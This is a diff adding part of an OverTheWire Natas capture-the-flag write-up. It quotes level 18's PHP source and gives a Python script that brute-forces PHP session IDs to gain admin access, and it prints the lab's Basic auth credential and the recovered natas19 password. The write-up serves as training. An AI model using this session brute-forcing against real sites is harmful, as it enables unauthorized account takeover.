@@ -480,7 +480,125 @@ It may take a while longer to run because we literally delay responses, but it r
 ### Natas 18
 A login form for an admin account:
 <img width="624" height="271" alt="image" src="https://github.com/user-attachments/assets/73bae533-eef7-4e71-9142-0ea7e24546b5" /><br/>
+Code is a doozy, but we'll manage:
+```
+<?php
 
+$maxid = 640; // 640 should be enough for everyone
+
+function isValidAdminLogin() { /* {{{ */
+    if($_REQUEST["username"] == "admin") {
+    /* This method of authentication appears to be unsafe and has been disabled for now. */
+        //return 1;
+    }
+
+    return 0;
+}
+/* }}} */
+function isValidID($id) { /* {{{ */
+    return is_numeric($id);
+}
+/* }}} */
+function createID($user) { /* {{{ */
+    global $maxid;
+    return rand(1, $maxid);
+}
+/* }}} */
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function my_session_start() { /* {{{ */
+    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+    if(!session_start()) {
+        debug("Session start failed");
+        return false;
+    } else {
+        debug("Session start ok");
+        if(!array_key_exists("admin", $_SESSION)) {
+        debug("Session was old: admin flag set");
+        $_SESSION["admin"] = 0; // backwards compatible, secure
+        }
+        return true;
+    }
+    }
+
+    return false;
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas19\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+    }
+}
+/* }}} */
+
+$showform = true;
+if(my_session_start()) {
+    print_credentials();
+    $showform = false;
+} else {
+    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+    session_id(createID($_REQUEST["username"]));
+    session_start();
+    $_SESSION["admin"] = isValidAdminLogin();
+    debug("New session started");
+    $showform = false;
+    print_credentials();
+    }
+}
+
+if($showform) {
+?>
+```
+Now lets try and play with our form. Say I type in anything we get:
+<img width="652" height="117" alt="image" src="https://github.com/user-attachments/assets/c8953bb7-55b8-4235-8414-7dbebd9a2ab8" />
+And we'll see a `PHPSESSID` cookie with ID `418`, after trying a few more users this ID changes, and it's random, as we can see from this function:
+```
+function createID($user) { /* {{{ */
+    global $maxid;
+    return rand(1, $maxid);
+}
+```
+At first I thought great, if the ID is created using the username then I can just type in `admin` and the `PHPSESSID` would be the actual admin's ID, but it is randomized each time. Still, I'm assuming admin has to have a session ID, so let's try bruteforcing session IDs (We know there's just 640):
+```
+import requests
+import string
+
+
+
+for i in range(1, 641):
+    base_injection = f'PHPSESSID={i}'
+    headers = {
+        "accept": "application/json",
+        "Authorization": "Basic bmF0YXMxODpmREduMkE2R3NjMEJVcDNiWncwUk5YcGcwUFp0NDBvcA==",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
+        "Cookie": base_injection
+    }
+    response = requests.post("http://natas18.natas.labs.overthewire.org/", data={"username":"admin", "password":"potaot"}, headers=headers)
+    if "You are an admin." in response.content.decode():
+        print(response.content.decode())
+        break
+
+```
+Each time we include a different ID in the header. Hopefully when we match the actual admin's session ID we'll get the password for natas 19. Running this, ID 119 nets us the desired result:
+```
+<div id="content">
+You are an admin. The credentials for the next level are:<br><pre>Username: natas19
+Password: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+Tada! Password is `qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT`.
+
+### Natas 19
+For the first time we are not provided a source code, but do get a note:
+<img width="576" height="264" alt="image" src="https://github.com/user-attachments/assets/51f4a58c-0824-48cf-9016-86dfaa8f3877" /><br/>
+IDs are no longer sequential... But they were always random? I'm a bit confused on this.
 
 [image1]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnAAAABoCAYAAABxCc18AAASc0lEQVR4Xu3dC3Bc5XXA8XWTTKfkjcGEDMKODFjB4HFDDCZ2TSBxGCLXQ0lDH3TqNqRNSpkWQrLCpBNoyaRJTMqMEw/2JJlJrCY8bTB+4QdGfoEtTFEDbjpJp48UhriWZBsLA8b26Z5799v99uzd1Vr6Vnt3/T/DD+3efehK+jT3P1eSN5PJZAQAAABNpWwDAAAA0q1sAwAAANKtbAMAAADSrWxD3a3b+3LJ9Z889ys59np/2f0AAACQqGxD3bzy8l45JvEUtrf9nWy4Jb5csh0AAACV5P63aE8+q4byGxeVxdSC/Ft3T3/cfVYuKH3yfUNH5ejQPmnLXFvY9u1nT5Q8Zleu6NzjdG7xHg8AAIBE8YUFK18pnB1ry13XpnO3bRgoDTWl88rKBYXrt+Tv5K5rpu3ftTh//a8L223A6SzyLu9ZVLaDAAAAKBVf0IDTty7i/IC7qy2OK/8Mm44fcDvuaou2uettn/p6/pl03Jm98oDbJ6UBt3RG2Q4CAACgVHzBBZzyf09t6V53rbhN6biAm7N0b/EOQ1ujbTvuOjd/346Sx9mAm/G9F0p+hOq2AwAAoKL4wgtDIh3eDZptmY75uUpbG2/Ty7l54Qc3SKbtkuiyDGyXONBc/MWxdkNH/CPUld/6QnzfY4cKz/u/b8UPnd1RfF8ytEfm3/e8rP3KHLtzAAAAKFe2AQAAAOlWtgEAAADpVrYBAAAA6Va2AQAAAGm2Z88eAQAAQPMg4AAAAJoMAQcAANBkCDgAAIAmQ8ABAAA0GQIOqINnn3020tvbC5yy3PeB/f4AMHoEHBCYHrB2794tO3fulB07dgCnLP0eeOaZZ4g4oA4IOCAgF289PT0yMDAgg4ODkQMHDkQOHjwYOXToUMGrr75a4vDhw0Cq2DWq3Pp1a9qtcbfmdf339/dH9HuCiAPCIuCAgPQgpWccNm3aVBJvNtwqxdrQ0BCQWklRVy3kXMRxFg4Ij4ADAnIBt3HjxsR4s+FmD5CvvfYakFpJMZcUcjbiCDggPAIOCMgPuKR4s+FmD5BHjhwZ1uuvvw4EY9dXNUkx54ecjTgCDqgfAg4IKCngkuItKdjsgdX3xhtvAGPGrr+k4EsKuUoRR8Ch0U6/4PLUs/s8HAIOCMgPuFrjrdZQe/PNN4G6sGutkkohlxRxBBzSwoZSmtl9r4aAAwLyA87+zpuLNxtuJxNpR48eBYKya6waG3K1RhwBh0axgdQM7MdQCQEHBJQUcJXiLSnc7MEVSIvhQs5FHAGHtNA1d+aHZw9rwoW/I6u37Jav3bNMZnbeINd97kuy7bl/k3dOuqTsvklsgI1Wrd8rBBwQUC0B58dbpXB76623gFSwazMp4uyZOBtxBBwaYdmyZXJGx6yqzuyYLT/7j5fktHM/ImdNnSMPr98q/7xqs2za2Sfrtu6R8VM+VvYYa/wUDa+flIXYSC3N7bf9WJIQcEBAfsBVijcXcDbe7IHz2LFjQEPZNWlDzkYcAYc0WbhwYRRYEy6cI2dffKWcM/2TMvGSq+VDl35azrv8d2XK7N+Tzc/8q1x81fVy8Sf+QKZe+Vn59/96WRb/+FHZsONfZNfPfim/fKlfLph9rVwwa75MnjlPJs64Rtp+e658cNpV0fPq86/+PxF5UQPu7nyExW/XdF2eu+Hnsma/RNd1Fr9wQta82JPflhx9ut/2Y0lCwAEB1RJww8WbPYgCaVAt4ir9KJWAQyPdfvvtpXF0/uXy/pzMGVPkXZMukbedNVUy7z8v2qbeO/ky+eJX/0m+eMc9cs2f3CJf/uYP5bZ//L5MvuzT0jbtCpk0/eOF5/Gfd3z01o8xP+D65bsbe3KB1yPffVHkpg3749vyUZdE99t+LEkIOCAgG3A23vyAs/FmD5jq+PHjQMPY9Wgjzv9xalLAubNwBBwaQUPIxZnv7ROmyG+Mnyz/+etX5euLvy9/evNCed95M2X9tufkju/8SG689Wvyx3/VJdd9/ivypbvukSs/85ey5qle2Xf4uJzRMbvs+WyAjRYBBzSAH3C1nH1Lijd7EAXSoFrEEXBIIw0hDbNyl8ne/xmU2/7+XpnQMVO+kL1b3tP+UVm3/Xm59e4l8tm/uE2uu/HLsvCb98miZT+VT/z+5+X+NVvlF68Myfgps8qezwbYaBFwQAPUGnCVzr7Zg6Zz4sQJYMzY9Vct4pLOwhFwSAMNIf2xaEEu3FzAvW3Ch3PbLpWv3rtcMu+eWIix3zpnmtz6jWXyt/+wRG7Mfks+cNEV8o4PXCiZ08/POa/weP95bYCNFgEHNMDJBNxw8WYPqkAj2HXpR1y1s3AEHBrNnYEb3zFLzrro43LO9LkyacY1cv7H5suFV3xGLv7kH8o3liyXX+0blEvn/bnM6PwzuWze5+SmO74tL+0/KD//75ejbdPn/pFMvfL66I8e2mfOk3M/crWcPe2q6Mep7zs/PgN308b+6G38xwy5t/t7pE9ETv9BT3Q9utzVI6s39ES/G7dmo/uDh3IEHNAASQGXFG8u4JLizR5AgUarFHD+WTgbcLr2CTg0kobQaWd3yLs/NKOqqXOujc6q6eXZ8xfI9368UhYt/am844PTyu6bJAq23GiYaaTpuG36hwt29LZ9FQLuPW1TCTigEUYbcPbAWQ3DhBi7rioZScC5v0Ql4NAId955p/zmGZPktHMuknflQquyj8rpU2ZFPy7V62/XcGu396nMRthIvXfSdHnnWe3RftuPJQkBBwRkA67Sj09HEnAMMxZj150NOBdxBBzSbsWKFXLmpIuiKFIaSDaa0sCFm9L91f22H0sSAg4IqNaAq/T7b/4BM5PpDB5vfdlOuyl1k23PFK90x/vbHfBzoHMyT9ee1d9eqW2a4fNby9h4Swo4//fgCDikka65rq6uQhw1A93fWr9XCDggoJEEnH9gLA24TERHI0LDJlLoCb3QnftvXuHacn1ce1Y684/T2zUENYRy98xdbs9vL47/Pro7M9I1eZyWSLTtRPSsIp25B+vzxvctBo0+p53o/UX71Zl7mvz7y13W992uj89Hmb6/9mh/4udzzxXve+627POF++rH1anPm9uvbG7//KbSi9H+ec+t4z4PJfugd8y9Jxdw7nF6P92f+PboztH/9f3o7VFU6udw3rjC18D/PLnPe/z5dZ+zvuh6tr3d+3o0z9iA8yOOgEOz2Lx5cxRFn5p/fVkspYnun+6n7q/9GCoh4ICAwgZcMUbirtD/mbNB+aDJXymGiRcM7gySH3DZ7jg8osv5M16uXeaN0+crhow+XGls2RCxZ6eiANJ9ygenP3pXfbzbrsGj9+3OZr1wKu67Dbjo/tH47zN+nD4++nzlg0rHPaW/z/HulgZcfHvxeXQK0SfFsNVtfV2T9dZoe/HzVPy8R59fPyLzzxeFa5ONjTcCDs2qt7c3+sMADaS00v3T/bT7Xg0BBwTkB1yt/4RIpYBT9Rqvl0Y/XgwyrTN2LRJwaHa6BtPK7mstCDggIP1GHGnA2YNlPQOOYWoZux5HEnD6T4kQcEB4BBwQUMiAY5hGj12TBByQHgQcEBABx7TS2DVJwAHpQcABARFwTCuNXZOVAs6POAIOGBsEHBAQAce00tg1ScAB6UHAAQERcEwrjV2TBByQHgQcEBABVzqLF/9I7r33hy1l795fyKpVG8u2n4xmGbsmCTggPQg4ICACrvVHA2zfvoFRaZaIs2uSgAPSg4ADAgoZcP4rMSSO96oDNc3J3l/0pbQYO37A3TwxfrkzG2jWlpsnEXAEHBAUAQcEFDbgiq+FqjGnl/UFFOLX5+yUbGfx5Z50e/Elo+KXenKPcZfj++ttxZdh0Evxa3jGr5dqX7NUA869P/d80UtidRdfIzR6Gavcc0QvkTWCSGy28QMuM/Fv4stLrs69va+wfe6SgZKwI+AIOCA0Ag4IKGzAea+pmSm+MHz0uqT6Py+W4vv2yfJstvBanP7rjpbcv/C44muKutcZ1S3Z5/WF44sBF0VePuAKz93tXkM1H4vR4/X1SJvvNT9Pdsp/hHqfLJk7rnD9yV/3y8Sbt+bjbmtJwG0h4AAEQsABAYUMuGabbGccgdlsyBdaTd+UB9zJI+AAjBYBBwR0KgfcqTIhAk7/irUZxq5JAg5IDwIOCIiAY1pp7Jok4ID0IOCAgAg4ppXGrkkCDkgPAg4IiIBjWmnsmiTggPQg4ICACDimlcauSQIOSA8CDgiIgGNaaeyaJOCA9CDggIAIOKaVxq5JAg5IDwIOCIiAY1pp7Jok4ID0IOCAgAg4ppXGrkkCDkgPAg4IiIBjWmnsmiTggPQg4ICACDimlcauSQIOSA8CDgiIgGNaaeyaJOCA9CDggIAIOKaVxq5JAg5IDwIOCIiAY1pp7Jok4ID0IOCAgEIGXCbTHh1E+7Lx21pm3rxuu4lhRjx2TRJwQHoQcEBAIQOuPduXP4z2iWaZXu3MZES6O6Ntmdzl7s6MdE0el7+XSKZzef4xDDP6sWuSgAPSg4ADAgoZcPYMXGnAaaxp1nUTcEzdxq5JAg5IDwIOCChkwA03ccAxTP3GrkkCDkgPAg4IaCwDjmHqPXZNEnBAehBwQEAEHNNKY9ckAQekBwEHBETAMa00dk1WCjgXb7rOCThgbBBwQEAEHNNKY9ckAQekBwEHBBQy4Ig4ptFj1yMBB6QHAQcENJqAS4o4hmnU2LU40oA7dOgQAQfUAQEHBOQHnB68CDhmJJNpPxy97cseNLeMzej7t2uRgAPShYADAgodcETcqTnZ9sH4rf7rzN2HosuZzGD0ihz6tr1wOQ48DT29b1/Xweh2vb78RHy7XtZt+jzu/tF1723X5MHc5eL7iQPujegyAQekEwEHBFRrwLmIcwfCagFHzJ2a0549El+IAu7N4g19h6U7e1gynfnb86PX/W0acO35gNNpz8bPkXRWL34BjyNyYvkhOZ5bZxpwGnRJ8UbAAelAwAEB1TvgiDkm9Nh1VYkNOHcWmYADGoOAAwKyAef+kMEPOP/HqC7gRhpxwFiw8eaffasWcPoXqAQcUB8EHBBQpYBLOgvn/x6c/V04Qg5pYdelPftWKeDcPyFCwAH1QcABAZ1MwFU7C2fZgypQT3b9+fFmA86dVfYDzv834Ag4oD4IOCCgWgOu0lm4ahEHNFJSvFU6+0bAAfVHwAEB+QGnBy8bcJXOwtmII+SQFnZdDnf2jYADxgYBBwRkA66Ws3B+xCWFHJAG/hq1Z98qBZzG28GDBwk4oA4IOCCgWgKulogj5pAGdj26tVpLvLmzbwQcUB8EHBCQH3B68KoUce7AZyOuUsgBjWTDzf7olIADxh4BBwRUS8BVijgbckCa2HCrNd4OHDhAwAF1QMABASUFXLWI80POxhxhh7Fk11ySpHDz442AA8YOAQcE5AecHrz8s3B+xNnfibMhV0vUAfVi16ANNxtv1c6+EXBAfRBwQEB+wOmBq5aIs2fkktgDKVBPdv3ZaLPhZuPND7jBwUECDqgDAg4IKCngKkWcH3I25ix7IAXqxa69pGiz4VYt3gg4oD4IOCAgP+D0wOV+hOQizv5enB9zPv9ACTSaXZ9u7bpw839sauNtYGCAgAPqgIADAvIDTg9cNuKqhZxlD5pAI9h16UebPeuWFG/9/f0EHFAHBBwQkB6kdu3aJZs3b44OXjbikkLOj7lq7EEUqAe77pL4a9cPt6R4U/o9QcABYRFwQGC9vb2ydevW6MDlR1ylkEsKOiCt/DXrr2c/3Px4279/f/Q9Yb9PAIwOAQcE5s7Cbdu2TbZs2SJPPPGErF69WlasWCEPPvig3H///QUPPPBAtO2hhx6Shx9+WB555JHofitXrpRHH3008thjj8mqVavk8ccfj55HrVmzRtauXSvr1q2T9evXR/T9qA0bNkQ/wnU2bdoUnRF88sknI7pPzlNPPRXp6ekp0PhUuv/D2b59e0U7duxAjv28+OznM4n7evhfI/d187+W7uurX2v9mvtrQNeEWx9uvShdQ7qW3LrSNaZrTdecW3+6FnVN6trUNaprVdesrl1/Les2vZ8+j74f3Sfd/6effpqzb0AdEHBAHegZh927d8vOnTujg68eWPUgqgdNG1263UVXtdBKCqykUNL3qfTAqfT3jxwNy+HofleiHxfqx36+ffbrlMT/Wruvv1sPdp24gLSBOFwYuvXqx6Bb07pd76vPp+/TrRn7/QFg9Ag4oE7cAVkPonrA9A+W9iyXCzEbXzbCkiLLRoClZz+qsfuN5mC/jpZdB1ZSHNr4S4pA/8xh0nrW++hj3NpkjQH18f8VjTn4d2ffgwAAAABJRU5ErkJggg==>
 
